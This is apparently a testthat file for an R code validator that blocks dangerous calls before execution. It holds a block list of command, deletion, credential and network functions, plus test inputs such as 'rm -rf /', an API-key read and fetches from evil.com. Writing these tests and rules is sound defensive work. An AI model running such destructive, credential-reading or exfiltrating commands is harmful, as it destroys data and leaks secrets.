# =============================================================================
# Tests for the pre-execution security framework
#
# Run:  testthat::test_file("tests/testthat/test-security.R")
#
# All tests are self-contained: security logic is inlined so tests run
# without loading the full package environment.
# =============================================================================

library(testthat)

# ---------------------------------------------------------------------------
# Inline the three functions under test
# ---------------------------------------------------------------------------

BLOCKED_FNS <- c(
  "system"           = "OS command execution",
  "system2"          = "OS command execution",
  "shell"            = "OS command execution",
  "shell.exec"       = "OS command execution",
  "unlink"           = "file deletion",
  "file.remove"      = "file deletion",
  "q"                = "session termination",
  "quit"             = "session termination",
  "stopApp"          = "session termination",
  "Sys.setenv"       = "environment variable modification",
  "Sys.unsetenv"     = "environment variable modification",
  "Sys.getenv"       = "credential access",
  "download.file"    = "network access",
  "socketConnection" = "raw network access",
  "serverSocket"     = "raw network access",
  "make.socket"      = "raw network access",
  ".Call"            = "native code execution",
  ".C"               = "native code execution",
  ".Fortran"         = "native code execution",
  ".External"        = "native code execution",
  ".External2"       = "native code execution",
  "source"           = "arbitrary file execution",
  "sys.source"       = "arbitrary file execution"
)

extract_calls <- function(parsed_exprs) {
  calls <- character(0)
  walk <- function(node) {
    if (is.call(node)) {
      fn <- node[[1]]
      if (is.name(fn)) {
        calls <<- c(calls, as.character(fn))
      } else if (is.call(fn) && length(fn) == 3 &&
                 as.character(fn[[1]]) %in% c("::", ":::")) {
        fn_name <- as.character(fn[[3]])
        calls <<- c(calls, fn_name,
                    paste0(as.character(fn[[2]]), "::", fn_name))
      }
      if (is.name(node[[1]]) && as.character(node[[1]]) == "do.call" &&
          length(node) >= 2 && is.character(node[[2]])) {
        calls <<- c(calls, as.character(node[[2]]))
      }
      if (is.name(node[[1]]) && as.character(node[[1]]) == "get" &&
          length(node) >= 2 && is.character(node[[2]])) {
        calls <<- c(calls, as.character(node[[2]]))
      }
      for (i in seq_along(node)) tryCatch(walk(node[[i]]), error = function(e) NULL)
    } else if (is.recursive(node)) {
      for (item in node) tryCatch(walk(item), error = function(e) NULL)
    }
  }
  for (expr in as.list(parsed_exprs)) walk(expr)
  unique(calls)
}

validate_r_code <- function(code) {
  if (is.null(code) || length(code) == 0) return(list(safe = TRUE, issues = character(0)))
  code_str <- paste(code, collapse = "\n")
  if (nchar(trimws(code_str)) == 0) return(list(safe = TRUE, issues = character(0)))
  issues <- character(0)
  parsed <- tryCatch(parse(text = code_str), error = function(e) NULL)
  if (!is.null(parsed)) {
    found <- extract_calls(parsed)
    matched <- found[found %in% names(BLOCKED_FNS)]
    for (fn in unique(matched)) {
      issues <- c(issues, paste0("'", fn, "' is not permitted (", BLOCKED_FNS[[fn]], ")."))
    }
    if ("eval" %in% found && "parse" %in% found) {
      issues <- c(issues, "'eval(parse(...))' is not permitted — it can execute arbitrary code.")
    }
  }
  regex_checks <- list(
    list(pattern = "\\.GlobalEnv|globalenv\\s*\\(",
         message = "Direct access to the global R environment is not permitted."),
    list(pattern = "readLines\\s*\\(['\"]https?://",
         message = "'readLines()' with a remote URL is not permitted."),
    list(pattern = "url\\s*\\(['\"]https?://",
         message = "Opening remote URL connections is not permitted."),
    list(pattern = "Sys\\.sleep\\s*\\(\\s*[5-9][0-9]{2,}|Sys\\.sleep\\s*\\(\\s*[0-9]{4,}",
         message = "Extremely long 'Sys.sleep()' calls are not permitted (potential denial of service)."),
    list(pattern = "while\\s*\\(\\s*TRUE\\s*\\)|repeat\\s*\\{",
         message = "Unconditional infinite loops ('while(TRUE)' / 'repeat') are not permitted.")
  )
  for (chk in regex_checks) {
    if (grepl(chk$pattern, code_str, perl = TRUE)) issues <- c(issues, chk$message)
  }
  list(safe = length(issues) == 0, issues = unique(issues))
}


# =============================================================================
# 1. BLOCKED_FNS covers all required categories and key functions
# =============================================================================

test_that("BLOCKED_FNS covers all required categories and key functions", {
  categories <- unique(unname(BLOCKED_FNS))
  required_categories <- c(
    "OS command execution", "file deletion", "session termination",
    "environment variable modification", "credential access",
    "network access", "native code execution", "arbitrary file execution"
  )
  for (cat in required_categories) {
    expect_true(cat %in% categories, info = paste("Missing category:", cat))
  }

  must_include <- c("system", "system2", "shell", "unlink", "file.remove",
                    "q", "quit", "stopApp", "Sys.setenv", "Sys.getenv",
                    "download.file", ".Call", "source")
  for (fn in must_include) {
    expect_true(fn %in% names(BLOCKED_FNS), info = paste("Missing function:", fn))
  }
})


# =============================================================================
# 2. extract_calls — key AST traversal behaviours
# =============================================================================

test_that("extract_calls finds nested and qualified calls", {
  # nested plain calls
  parsed <- parse(text = "result <- mean(sqrt(x))")
  calls <- extract_calls(parsed)
  expect_true("mean" %in% calls)
  expect_true("sqrt" %in% calls)

  # pkg:: and pkg::: forms both resolved to the bare function name
  expect_true("system" %in% extract_calls(parse(text = 'base::system("ls")')))
  expect_true("system" %in% extract_calls(parse(text = 'base:::system("ls")')))
})

test_that("extract_calls resolves do.call and get() string literals", {
  expect_true("system" %in% extract_calls(parse(text = 'do.call("system", list("ls"))')))
  expect_true("system" %in% extract_calls(parse(text = 'get("system")("ls")')))
})

test_that("extract_calls does not flag a blocked name used as a variable", {
  # 'q' assigned, not called — should not appear in the call list
  parsed <- parse(text = "q <- quantile(x, 0.95)\nplot(q)")
  expect_false("q" %in% extract_calls(parsed))
})


# =============================================================================
# 3. Safe code passes without issues
# =============================================================================

test_that("typical data-analysis code is safe", {
  safe_snippets <- c(
    "ggplot(df, aes(x = Sepal.Length)) + geom_histogram()",
    "df %>% filter(Species == 'setosa') %>% summarise(n = n())",
    "model <- lm(mpg ~ wt, data = mtcars); summary(model)",
    "pacman::p_load(ggplot2, dplyr)",
    "Sys.sleep(1)",
    "q1 <- quantile(df$value, 0.25)",
    "write.csv(df, 'out.csv', row.names = FALSE)",
    "result <- tryCatch(log(df$x), error = function(e) NA)"
  )
  for (code in safe_snippets) {
    res <- validate_r_code(code)
    expect_true(res$safe, info = paste("Expected safe but blocked:", code))
    expect_length(res$issues, 0)
  }
})


# =============================================================================
# 4. Each blocked category is caught — one representative call per category
# =============================================================================

blocked_cases <- list(
  list(code = 'system("ls -la")',                         fn = "system"),
  list(code = 'unlink("file.txt")',                       fn = "unlink"),
  list(code = 'q("no")',                                  fn = "q"),
  list(code = 'Sys.setenv(KEY = "x")',                    fn = "Sys.setenv"),
  list(code = 'Sys.getenv("AZURE_OPENAI_API_KEY")',        fn = "Sys.getenv"),
  list(code = 'download.file("https://evil.com", "f")',   fn = "download.file"),
  list(code = 'socketConnection("evil.com", port = 1234)', fn = "socketConnection"),
  list(code = '.Call("native_fn", x)',                    fn = ".Call"),
  list(code = 'source("bad.R")',                          fn = "source")
)

for (case in blocked_cases) {
  local({
    co <- case$code; fn <- case$fn
    test_that(paste0(fn, "() is blocked"), {
      res <- validate_r_code(co)
      expect_false(res$safe)
      expect_true(any(grepl(fn, res$issues, fixed = TRUE)),
                  info = paste("Expected issue mentioning", fn))
    })
  })
}


# =============================================================================
# 5. Obfuscation bypasses and regex-layer catches
# =============================================================================

test_that("obfuscation bypasses are all caught", {
  # Namespace-qualified forms
  expect_false(validate_r_code('base::system("rm -rf /")')$safe)
  expect_false(validate_r_code('base:::unlink("data.csv")')$safe)

  # Indirect call via do.call / get()
  expect_false(validate_r_code('do.call("source", list("bad.R"))')$safe)
  expect_false(validate_r_code('fn <- get("quit"); fn()')$safe)

  # eval(parse()) combo — both same line and across lines
  expect_false(validate_r_code('eval(parse(text = "system(\'ls\')"))')$safe)
  expect_false(validate_r_code('cmd <- "system(\'ls\')"\neval(parse(text = cmd))')$safe)

  # Regex-layer catches
  expect_false(validate_r_code('assign("x", 1, envir = .GlobalEnv)')$safe)
  expect_false(validate_r_code('readLines("https://evil.com/steal")')$safe)
  expect_false(validate_r_code('while(TRUE) { x <- x + 1 }')$safe)
  expect_false(validate_r_code('repeat { do_something() }')$safe)
  expect_false(validate_r_code('Sys.sleep(99999)')$safe)

  # Boundary: readLines with a local path is fine
  expect_true(validate_r_code('readLines("local_file.txt")')$safe)
})


# =============================================================================
# 6. Edge cases and output contract
# =============================================================================

test_that("edge cases return correct structure and multiple issues are reported", {
  # NULL / empty / whitespace → safe, no issues
  expect_true(validate_r_code(NULL)$safe)
  expect_true(validate_r_code("")$safe)
  expect_true(validate_r_code("   \n\t  ")$safe)

  # Character vector input (not just a single string)
  expect_false(validate_r_code(c("x <- 1", 'system("ls")'))$safe)

  # Syntax error: AST layer skipped but regex still fires
  expect_false(validate_r_code('while(TRUE) { @@invalid')$safe)

  # Multiple violations all reported; issues are deduplicated
  multi <- validate_r_code('system("ls")\nquit()\ndownload.file("http://evil.com", "f")')
  expect_false(multi$safe)
  expect_gte(length(multi$issues), 3)

  system_issues <- validate_r_code('system("ls")\nsystem("pwd")')$issues
  expect_length(system_issues[grepl("'system'", system_issues, fixed = TRUE)], 1)
})


# =============================================================================
# 7. extract_strings — string literal extraction
# =============================================================================

extract_strings <- function(parsed_exprs) {
  strings <- character(0)
  walk <- function(node) {
    if (is.character(node)) {
      strings <<- c(strings, node)
      return()
    }
    if (is.call(node) || is.expression(node)) {
      for (i in seq_along(node)) tryCatch(walk(node[[i]]), error = function(e) NULL)
    } else if (is.recursive(node)) {
      for (item in node) tryCatch(walk(item), error = function(e) NULL)
    }
  }
  for (expr in as.list(parsed_exprs)) walk(expr)
  unique(strings)
}

test_that("extract_strings returns string literals, not symbol names", {
  parsed <- parse(text = 'x <- "hello"; y <- paste(x, "world")')
  strings <- extract_strings(parsed)
  expect_true("hello" %in% strings)
  expect_true("world" %in% strings)
  # symbol names should not appear
  expect_false("x" %in% strings)
  expect_false("y" %in% strings)
  expect_false("paste" %in% strings)
})

test_that("extract_strings returns unique values only", {
  parsed <- parse(text = 'paste("a", "a", "b")')
  strings <- extract_strings(parsed)
  expect_equal(sum(strings == "a"), 1L)
})

test_that("extract_strings handles empty/no-string input", {
  expect_length(extract_strings(parse(text = "x <- 1 + 2")), 0)
  expect_length(extract_strings(parse(text = "")), 0)
})


# =============================================================================
# 8. diff_is_significant — LLM escalation heuristic
# =============================================================================

SAFE_FNS_minimal <- c("mean", "sd", "plot", "lm", "summary", "ggplot", "filter")

diff_is_significant_test <- function(original_code, edited_code, n_chars = 40) {
  orig_str <- paste(original_code, collapse = "\n")
  edit_str <- paste(edited_code,   collapse = "\n")
  if (abs(nchar(edit_str) - nchar(orig_str)) >= n_chars) return(TRUE)
  parse_safe <- function(code) {
    tryCatch(parse(text = code, keep.source = FALSE), error = function(e) NULL)
  }
  orig_parsed <- parse_safe(orig_str)
  edit_parsed <- parse_safe(edit_str)
  if (!is.null(orig_parsed) && !is.null(edit_parsed)) {
    new_calls <- setdiff(extract_calls(edit_parsed), extract_calls(orig_parsed))
    if (length(setdiff(new_calls, SAFE_FNS_minimal)) > 0) return(TRUE)
    if (length(setdiff(extract_strings(edit_parsed), extract_strings(orig_parsed))) > 0) return(TRUE)
  }
  FALSE
}

test_that("diff_is_significant triggers on large character change", {
  orig <- "x <- mean(df$value)"
  # 41-char addition pushes over the n_chars=40 threshold
  edit <- paste0("x <- mean(df$value) # ", strrep("a", 41))
  expect_true(diff_is_significant_test(orig, edit))
})

test_that("diff_is_significant triggers on new unknown function call", {
  orig <- "x <- mean(df$value)"
  edit <- "x <- some_unknown_pkg_fn(df$value)"
  expect_true(diff_is_significant_test(orig, edit))
})

test_that("diff_is_significant does NOT trigger for new safe function calls", {
  orig <- "x <- mean(df$value)"
  edit <- "x <- mean(df$value)\nplot(df)"  # plot is in SAFE_FNS_minimal; < 40 chars diff
  expect_false(diff_is_significant_test(orig, edit))
})

test_that("diff_is_significant triggers on new string literal", {
  # Only "plot" is called (safe); the sole new element is the string "My Plot".
  # nchar diff is < 40, so only the string-literal layer (Layer 3) can fire.
  orig <- 'plot(df)'
  edit <- 'plot(df, main = "My Plot")'
  expect_true(diff_is_significant_test(orig, edit))
})

test_that("diff_is_significant returns FALSE for identical code", {
  code <- "x <- mean(df$value)"
  expect_false(diff_is_significant_test(code, code))
})

test_that("diff_is_significant returns FALSE when only comments change", {
  orig <- "x <- mean(df$value)"
  edit <- "# compute mean\nx <- mean(df$value)"  # comments not in AST; < 40 chars
  expect_false(diff_is_significant_test(orig, edit))
})

